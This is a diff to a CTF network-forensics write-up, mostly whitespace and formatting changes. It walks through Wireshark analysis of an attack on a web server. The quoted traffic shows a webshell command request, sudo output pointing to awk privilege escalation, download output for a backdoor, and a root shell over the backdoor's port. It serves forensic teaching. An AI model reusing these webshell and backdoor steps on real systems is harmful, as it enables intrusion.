@@ -13,6 +13,7 @@ section: "CTFs"
 All of these challenges were done with Wireshark.
 
 ### Initial Reconnaissance (capture1.pcapng)
+
 > Find the basic web enumeration tool that is used by the attacker.
 
 > First solved by my teammate Ch1maera!
@@ -38,6 +39,7 @@ There is a CVE header, looking it up on Google is a link to [`nikto` on GitHub](
 Flag: `KCTF{nikto}`
 
 ### Server & Attacker IP (capture1.pcapng)
+
 > In this challenge, I've crafted a series of intricate scenarios that will test your investigative skills. You'll dive into a network of secrets, uncover hidden identities, and piece together the story of a complex cyber attack. Each step requires careful analysis and keen observation. There are total 17 challenges & 3 pcap files in this category. The files will be provided accordingly. The answers are there, but they won't come easily—you'll need to think like an attacker and act like a detective. Get ready to unravel the mystery and prove your prowess in this thrilling journey.
 
 > What are the server & attacker IPs?
@@ -56,7 +58,7 @@ Flag: `KCTF{192.168.1.10_192.168.1.9}`
 
 > Flag Format: KCTF{127.0.0.1}
 
-We need to identify *real* admin traffic (as it looks like the attacker compromises the admin account).
+We need to identify _real_ admin traffic (as it looks like the attacker compromises the admin account).
 
 Filtering by `http && ip.addr != 192.168.1.9`.
 
@@ -75,6 +77,7 @@ Flag: `KCTF{192.168.1.3}`
 We need to find the username and password for the intruder.
 
 Looking for `http` traffic to a `/register` endpoint with a POST for the registration: `http.request.uri == "/register" && http.request.method == "POST"`
+
 ```
 POST /register HTTP/1.1
 Host: 192.168.1.10
@@ -146,6 +149,7 @@ From the name of the challenge and the fact they used a port I am thinking theft
 I filter for attacker IP traffic, if a frame contains `document.cookie` which stores the cookies in JS and if it's HTTP traffic: `frame contains "document.cookie" && http && ip.addr == 192.168.1.9`
 
 The first request is a POST to `/blog/create`
+
 ```
 POST /blog/create HTTP/1.1
 Host: 192.168.1.10
@@ -201,6 +205,7 @@ I filter for attacker traffic, if the frame contains `.php` (which I infer it's 
 ![maliciousupload.png](images/25-knight/maliciousupload.png)
 
 There is a `/blog/create` POST which we've seen is likely exploitable (as it was with XSS)
+
 ```
 POST /blog/create HTTP/1.1
 Host: 192.168.1.10
@@ -258,6 +263,7 @@ The webshell in the previous challenge uses the `cmd` parameter. I setup a filte
 ![shellhistory.png](images/25-knight/shellhistory.png)
 
 There is a `ls -la` which has the following:
+
 ```
 GET /uploads/678e2443a6725.php?cmd=ls%20-la HTTP/1.1
 Host: 192.168.1.10
@@ -297,6 +303,7 @@ drwxr-xr-x. 5 apache apache    120 Jan 19 17:34 ..
 Flag: `KCTF{php-reverse-shell.php_Jan_19}`
 
 ### The Overseer (capture2.pcapng)
+
 > What is the web-based server management tool that is used here?
 
 We now have a new capture, `capture2.pcapng`.
@@ -312,6 +319,7 @@ Cockpit is a [server management tool](https://cockpit-project.org/).
 Flag: `KCTF{cockpit}`
 
 ### The Gatekeeper (capture2.pcapng)
+
 > On which port does the web-based server management system is working?
 
 We just need to look at a `/cockpit` request and see the port the request is sent to, which is port `9090`
@@ -319,6 +327,7 @@ We just need to look at a `/cockpit` request and see the port the request is sen
 Flag: `KCTF{9090}`
 
 ### The Server's Identity (capture2.pcapng)
+
 > Find the **hostname** of the server.
 
 > First solved by my teammate Ch1maera!
@@ -328,6 +337,7 @@ We can search the PCAP for frames containing `hostname` (`frame contains "hostna
 ![serveridentitypackets.png](images/25-knight/serveridentitypackets.png)
 
 I find this in a TCP stream of the packets listed:
+
 ```
 <script>
 var environment = {"is_cockpit_client":false,"page":{"connect":true,"require_host":false,"allow_multihost":true},"logged_into":[],"hostname":"localhost.localdomain","os-release":{"NAME":"Rocky Linux","ID":"rocky","PRETTY_NAME":"Rocky Linux 9.5 (Blue Onyx)","CPE_NAME":"cpe:/o:rocky:rocky:9::baseos","ID_LIKE":"rhel centos fedora"},"CACertUrl":"/ca.cer"};
@@ -335,6 +345,7 @@ var environment = {"is_cockpit_client":false,"page":{"connect":true,"require_hos
 ```
 
 It has a key-value pair:
+
 ```
 "hostname":"localhost.localdomain"
 ```
@@ -342,6 +353,7 @@ It has a key-value pair:
 Flag: `localhost.localdomain`
 
 ### Tareq's Secret (capture2.pcapng)
+
 > First solved by my teammate Ch1maera!
 
 We need to find their password.
@@ -351,6 +363,7 @@ Likely it is going to be in a `login` request, but we want the response for only
 ![tareqssecretcap.png](images/25-knight/tareqssecretcap.png)
 
 Following the HTTP stream of the only request with a `200` we get this:
+
 ```
 GET /cockpit/login HTTP/1.1
 Host: 192.168.1.10:9090
@@ -395,6 +408,7 @@ The first 2 packets are nothing of interest while the next one (following the TC
 ![tcpstreamnetworks.png](images/25-knight/tcpstreamnetworks.png)
 
 Looking more at the commands (17th TCP Stream) the user executes we can see they try to use `awk` as it's in `sudo -l`:
+
 ```bash
 [tareq@localhost uploads]$ sudo -l
 sudo -l
@@ -431,6 +445,7 @@ Flag: `KCTF{awk}`
 We need to find where the backdoor was stored and what port it was retrieved from.
 
 Continuing to look through the 17th TCP Stream, there is some suspicious activity:
+
 ```bash
 sh-5.1# cd /root
 cd /root
@@ -471,8 +486,8 @@ Length: 16664 (16K) [application/octet-stream]
 Saving to: ...sys...
 
 
-sys                   0%[                    ]       0  --.-KB/s               
-sys                 100%[===================>]  16.27K  --.-KB/s    in 0s      
+sys                   0%[                    ]       0  --.-KB/s
+sys                 100%[===================>]  16.27K  --.-KB/s    in 0s
 
 2025-01-20 16:50:22 (275 MB/s) - ...sys... saved [16664/16664]
 ```
@@ -486,6 +501,7 @@ Flag: `KCTF{/root/.sys/sys_2081}`
 We need to find how many ports the backdoor opens.
 
 We see the server is initialised with several ports:
+
 ```bash
 sh-5.1# ./sys &
 ./sys &
@@ -516,11 +532,12 @@ I use Wireshark to iterate through the ports with filter `tcp.port == 1234x` and
 ![portfiestatraffic.png](images/25-knight/portfiestatraffic.png)
 
 Following the stream we can see a `whoami`:
+
 ```
 whoami
 Connected! If this is the right port, you can execute commands.
 Command> root
-Command> 
+Command>
 ```
 
 Flag: `KCTF{12345}`
@@ -528,6 +545,7 @@ Flag: `KCTF{12345}`
 ### The Unused Tool (capture3.pcapng)
 
 Going back to the commands the user executes, we can see they try to install `tmux` and fail to use it (omegaLUL):
+
 ```bash
 sh-5.1# which tmux
 which tmux
@@ -554,27 +572,27 @@ Downloading Packages:
                          [===                 ] ---  B/s |   0  B     --:-- ETA
 ...
 tmux-3.2a-5.el9.x86_ 30% [======              ] 204 kB/s | 144 kB     00:01 ETA
-tmux-3.2a-5.el9.x86_64.rpm                      203 kB/s | 475 kB     00:02    
+tmux-3.2a-5.el9.x86_64.rpm                      203 kB/s | 475 kB     00:02
 --------------------------------------------------------------------------------
-Total                                           141 kB/s | 475 kB     00:03     
+Total                                           141 kB/s | 475 kB     00:03
 Running transaction check
 Transaction check succeeded.
 Running transaction test
 Transaction test succeeded.
 Running transaction
 
-  Preparing        :                                                        1/1 
+  Preparing        :                                                        1/1
 
   Installing       : tmux-3.2a-5.el9.x86_64 [                             ] 1/1
 ...
-  Installing       : tmux-3.2a-5.el9.x86_64                                 1/1 
+  Installing       : tmux-3.2a-5.el9.x86_64                                 1/1
 
-  Running scriptlet: tmux-3.2a-5.el9.x86_64                                 1/1 
+  Running scriptlet: tmux-3.2a-5.el9.x86_64                                 1/1
 
-  Verifying        : tmux-3.2a-5.el9.x86_64                                 1/1 
+  Verifying        : tmux-3.2a-5.el9.x86_64                                 1/1
 
 Installed:
-  tmux-3.2a-5.el9.x86_64                                                        
+  tmux-3.2a-5.el9.x86_64
 
 Complete!
 sh-5.1# tmux new -s sys
